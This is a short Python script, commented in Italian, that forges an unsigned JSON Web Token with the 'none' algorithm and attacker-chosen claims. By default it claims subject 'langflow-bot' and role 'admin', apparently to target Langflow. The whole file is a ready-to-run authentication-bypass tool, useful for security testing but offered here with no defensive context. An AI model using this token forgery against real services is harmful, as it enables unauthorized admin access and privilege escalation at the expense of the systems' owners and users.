#!/usr/bin/env python3
"""jwt_none.py — genera un JWT con alg=none e claim a scelta.

Uso: jwt_none.py [sub] [role]
Es.: jwt_none.py langflow-bot admin
"""
import base64
import json
import sys


def b64(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


sub = sys.argv[1] if len(sys.argv) > 1 else "langflow-bot"
role = sys.argv[2] if len(sys.argv) > 2 else "admin"
print(f"{b64({'alg': 'none', 'typ': 'JWT'})}.{b64({'sub': sub, 'role': role})}.")
